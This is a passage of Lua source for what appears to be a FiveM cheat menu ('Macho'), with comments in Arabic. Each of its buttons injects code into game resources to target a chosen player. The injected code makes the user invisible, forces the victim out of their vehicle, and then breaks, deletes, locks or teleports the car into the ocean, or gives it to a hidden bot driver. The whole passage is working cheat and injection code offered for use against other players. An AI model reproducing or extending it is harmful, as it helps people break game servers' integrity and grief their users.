               MachoMenuNotification("Vehicle", "Hijacking vehicle from Player ID: " .. GetPlayerServerId(selectedPlayer))
           else
               MachoMenuNotification("Error", "Selected player is not in a vehicle")
           end
       else
           MachoMenuNotification("Error", "Player not found")
       end
   else
       MachoMenuNotification("Error", "No player selected")
   end
end)
MachoMenuButton(PlayerSection, "Kick from Vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)   
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(PlayerSection, "Destroy Vehicle Body", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            if DoesEntityExist(targetVehicle) then
                                -- فك جميع العجلات
                                for i = 0, 3 do
                                    BreakOffVehicleWheel(targetVehicle, i, true, false, true, false)
                                end
                                
                                -- فك جميع الأبواب
                                for i = 0, 3 do
                                    SetVehicleDoorBroken(targetVehicle, i, true)
                                end
                                
                                -- فك الشنطة الخلفية
                                SetVehicleDoorBroken(targetVehicle, 5, true)
                                
                                -- فك الكبوت
                                SetVehicleDoorBroken(targetVehicle, 4, true)
                            end
                            
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(PlayerSection, "Destroy Vehicle Engine ", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            if DoesEntityExist(targetVehicle) then
                                -- تخريب المحرك فقط
                                SetVehicleEngineHealth(targetVehicle, 0.0)
                                SetVehicleEngineOn(targetVehicle, false, true, true)
                            end
                            
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Engine damaged for Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)


MachoMenuButton(PlayerSection, "TP Vehicle To Ocean", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            SetEntityVisible(playerPed, true, false)
                            
                            Citizen.Wait(200)
                            
                            if DoesEntityExist(targetVehicle) then
                                NetworkRequestControlOfEntity(targetVehicle)
                                SetEntityAsMissionEntity(targetVehicle, true, true)
                                
                                Citizen.Wait(100)
                                
                                SetVehicleDoorsLocked(targetVehicle, 4)
                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                                for seat = 0, maxSeats do
                                    local ped = GetPedInVehicleSeat(targetVehicle, seat)
                                    if ped ~= 0 and ped ~= playerPed then
                                        SetPedCanBeDraggedOut(ped, false)
                                        SetPedConfigFlag(ped, 32, true)
                                        TaskWarpPedIntoVehicle(ped, targetVehicle, seat)
                                    end
                                end
                                
                                Citizen.Wait(100)
                                
                                SetEntityCoordsNoOffset(targetVehicle, -14382.92, 3330.65, -115.97, false, false, false)
                                SetEntityHeading(targetVehicle, 0.0)
                                SetVehicleOnGroundProperly(targetVehicle)
                            end
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(PlayerSection, "NPC Hijack Vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            SetEntityVisible(playerPed, true, false)
                            
                            Citizen.Wait(200)
                            
                            if DoesEntityExist(targetVehicle) then
                                NetworkRequestControlOfEntity(targetVehicle)
                                SetEntityAsMissionEntity(targetVehicle, true, true)
                                
                                Citizen.Wait(100)
                                
                                SetVehicleDoorsLocked(targetVehicle, 4)
                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                                for seat = 0, maxSeats do
                                    local ped = GetPedInVehicleSeat(targetVehicle, seat)
                                    if ped ~= 0 and ped ~= playerPed then
                                        SetPedCanBeDraggedOut(ped, false)
                                        SetPedConfigFlag(ped, 32, true)
                                        TaskWarpPedIntoVehicle(ped, targetVehicle, seat)
                                    end
                                end
                                
                                -- إنشاء بوت للقيادة (client side only)
                                local botModel = GetHashKey("mp_m_freemode_01")
                                RequestModel(botModel)
                                while not HasModelLoaded(botModel) do
                                    Citizen.Wait(0)
                                end
                                
                                -- إنشاء البوت مباشرة داخل السيارة
                                local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                
                                -- إعدادات البوت
                                SetEntityAsMissionEntity(botPed, false, false)
                                SetPedCanBeDraggedOut(botPed, false)
                                SetPedConfigFlag(botPed, 32, true)
                                SetPedFleeAttributes(botPed, 0, false)
                                SetPedCombatAttributes(botPed, 17, true)
                                SetPedSeeingRange(botPed, 0.0)
                                SetPedHearingRange(botPed, 0.0)
                                SetPedAlertness(botPed, 0)
                                SetPedKeepTask(botPed, true)
                                SetEntityCollision(botPed, false, false)
                                
                                -- البوت يظهر لي فقط (مخفي عن الآخرين)
                                SetEntityVisible(botPed, true, false) -- يظهر لي
                                NetworkSetEntityInvisibleToNetwork(botPed, true) -- مخفي عن الشبكة/اللاعبين الآخرين
                                
                                -- وضع البوت في السيارة كسائق فوراً
                                SetPedIntoVehicle(botPed, targetVehicle, -1)
                                
                                Citizen.Wait(100)
                                
                                -- إعدادات السيارة 
                                SetVehicleDoorsLocked(targetVehicle, 4)
                                SetVehicleEngineOn(targetVehicle, true, true, false)
                                
                                -- تحسين أداء السيارة بشكل معقول
                                SetVehicleEnginePowerMultiplier(targetVehicle, 1.5) -- زيادة بسيطة في قوة المحرك
                                ModifyVehicleTopSpeed(targetVehicle, 1.3) -- زيادة السرعة القصوى بنسبة 30%
                                
                                -- البوت يتمشى بالسيارة
                                Citizen.CreateThread(function()
                                    while DoesEntityExist(botPed) and DoesEntityExist(targetVehicle) do
                                        if IsPedInVehicle(botPed, targetVehicle, false) then
                                            -- الحصول على موقع السيارة الحالي
                                            local vehiclePos = GetEntityCoords(targetVehicle)
                                            
                                            -- إنشاء نقطة عشوائية قريبة للتمشي إليها
                                            local randomX = vehiclePos.x + math.random(-700, 700)
                                            local randomY = vehiclePos.y + math.random(-700, 700)
                                            local randomZ = vehiclePos.z
                                            
                                            -- مهمة القيادة بسرعة معقولة وثابتة
                                            TaskVehicleDriveToCoord(botPed, targetVehicle, randomX, randomY, randomZ, 35.0, 0, GetEntityModel(targetVehicle), 786603, 3.0, true)
                                            
                                            -- الحفاظ على سرعة ثابتة بدون قفزات مفاجئة
                                            SetVehicleForwardSpeed(targetVehicle, 25.0)
                                            
                                            Citizen.Wait(6000) -- انتظار 6 ثوان قبل تغيير الوجهة
                                        else
                                            break
                                        end
                                    end
                                end)
                                
                                -- حذف البوت بعد 2 دقيقة
                                Citizen.CreateThread(function()
                                    Citizen.Wait(120000) -- 2 دقيقة
                                    if DoesEntityExist(botPed) then
                                        DeleteEntity(botPed)
                                    end
                                end)
                                
                                SetModelAsNoLongerNeeded(botModel)
                            end
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle and added steady speed bot driver")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(PlayerSection, "LOCK Vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            if DoesEntityExist(targetVehicle) then
                                SetVehicleDoorsLocked(targetVehicle, 4)
                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                                for seat = 0, maxSeats do
                                    local ped = GetPedInVehicleSeat(targetVehicle, seat)
                                    if ped ~= 0 and ped ~= playerPed then
                                        SetPedCanBeDraggedOut(ped, false)
                                        SetPedConfigFlag(ped, 32, true)
                                        TaskWarpPedIntoVehicle(ped, targetVehicle, seat)
                                    end
                                end
                            end
                            
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(PlayerSection, "Delete Vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            if DoesEntityExist(targetVehicle) then
                                -- حذف السيارة
                                DeleteEntity(targetVehicle)
                            end
                            
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Vehicle deleted for Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)


-- دالة مساعدة لتعداد السيارات
function EnumerateVehicles()
    return coroutine.wrap(function()
